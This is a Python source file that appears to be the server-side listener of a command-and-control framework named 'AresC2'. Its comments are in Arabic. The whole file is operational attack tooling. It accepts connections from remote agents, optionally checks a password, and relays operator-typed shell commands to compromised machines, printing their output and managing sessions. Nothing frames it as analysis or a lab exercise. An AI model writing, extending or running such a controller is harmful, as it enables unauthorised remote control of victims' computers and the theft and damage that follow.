#/usr/bin/python3

import multiprocessing
import os
import socket
import sys
import signal
import threading

AgentParentChildBucket = multiprocessing.Manager().dict()
ProcessList = multiprocessing.Manager().dict()


def AgentSelector(AgentName):
    Command = ""
    try:
        for x, y in AgentParentChildBucket.items():
            if x == AgentName:
                for u, v in y.items():
                    while True:
                        Command = input(f"[{AgentName}]$ ")
                        if Command == "back":
                            break
                        
                        u.send(Command + "\n")
                        if Command == "exit":
                            break
    except KeyboardInterrupt:
        print("\n")


def recvDataThread(AgentConnection, AgentName):
    while True:
        recvData = b''
        try:
            while True:
                part = AgentConnection.recv(65536)
                recvData += part
                if len(part) < 65536:
                    break
            
            if recvData == b'':
                print(f"[x]{AgentName} disconnected!")
                break
            
            decoded_text = recvData.decode(errors="ignore")
            
            # تنظيف الفراغات والأسطر الزائدة الناتجة عن مخرجات الـ Windows Prompt
            # يتم تقسيم النص لأسطر، إزالة الفراغات الجانبية، وتجاهل الأسطر الفارغة تماماً
            cleaned_lines = [line.rstrip() for line in decoded_text.splitlines() if line.strip()]
            
            if cleaned_lines:
                # إعادة دمج الأسطر النظيفة وعرضها بشكل متناسق
                print("\n".join(cleaned_lines))
                
        except Exception:
            print(f"\n[x]{AgentName} dropped!")
            break


def ChildListener(AgentParent, AgentChild, AgentConnection, AgentAddress, AresC2Job, AgentFlag):
    AgentName = multiprocessing.current_process().name
    AgentPID = multiprocessing.current_process().pid
    
    try:
        AgentRequest = AgentConnection.recv(1024).decode('utf-8', errors="ignore").strip()
        if len(AgentRequest) < 5:
            AgentRequest = AgentConnection.recv(1024).decode('utf-8', errors="ignore").strip()
        
        print("[!] Agent Connection received. Verifying authenticity...")
        print(f"[+] Received Password : {AgentRequest}")

        if AgentFlag == AgentRequest or AgentFlag == "Null":
            print(f"[+] Agent connected => {AgentAddress[0]}:{AgentAddress[1]} || PID:{AgentPID} || {AgentName}")
            ProcessList[AgentPID] = AgentName
            AgentParentChildBucket[AgentName] = {AgentParent: AgentChild}
            
            t = threading.Thread(target=recvDataThread, args=(AgentConnection, AgentName))
            t.daemon = True
            t.start()

            while True:
                Command = AgentChild.recv()
                AgentConnection.sendall(Command.encode('utf-8'))
                if Command == "exit\n":
                    if AgentName in AgentParentChildBucket:
                        del AgentParentChildBucket[AgentName]
                    if AgentPID in ProcessList:
                        del ProcessList[AgentPID]
                    print(f"[!] Killed {AgentName}")
                    os.kill(int(AgentPID), signal.SIGKILL)
                    break

        else:
            print("[x] Authenticity Failed. Dropping connection!")
            os.kill(int(AgentPID), signal.SIGKILL)
            
    except socket.error:
        print("[x] Agent socket error, killing process...")
        if AgentName in AgentParentChildBucket:
            del AgentParentChildBucket[AgentName]
        if AgentPID in ProcessList:
            del ProcessList[AgentPID]
    except Exception:
        pass


class ParentListener(multiprocessing.Process):
    def __init__(self, lhost, lport, password):
        multiprocessing.Process.__init__(self)
        self.lhost = lhost
        self.lport = lport
        self.password = password
    
    def run(self):
        SocketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        SocketServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            SocketServer.bind((self.lhost, self.lport))
            SocketServer.listen(100)
            
            AresC2Job = multiprocessing.current_process().name
            AresC2JobPID = multiprocessing.current_process().pid
            ProcessList[AresC2JobPID] = f"{AresC2Job} => {self.lhost}:{self.lport}"
            
            print(f"\n[*] {AresC2Job} initiated")
            print(f"[*] Starting AresC2 Listener => {self.lhost}:{self.lport} || PID:{AresC2JobPID}")
            
            while True:
                AgentConnection, AgentAddress = SocketServer.accept()
                AgentParent, AgentChild = multiprocessing.Pipe()
                
                ChildListenerProcess = multiprocessing.Process(
                    target=ChildListener, 
                    args=(AgentParent, AgentChild, AgentConnection, AgentAddress, AresC2Job, self.password)
                )
                ChildListenerProcess.start()
        except socket.error as se:
            print(f"[x] Server Level Error: {se}\n")
        finally:
            SocketServer.close()


def Listener(lhost, lport, password):
    ParentListenerProcess = ParentListener(lhost, lport, password)
    ParentListenerProcess.start()
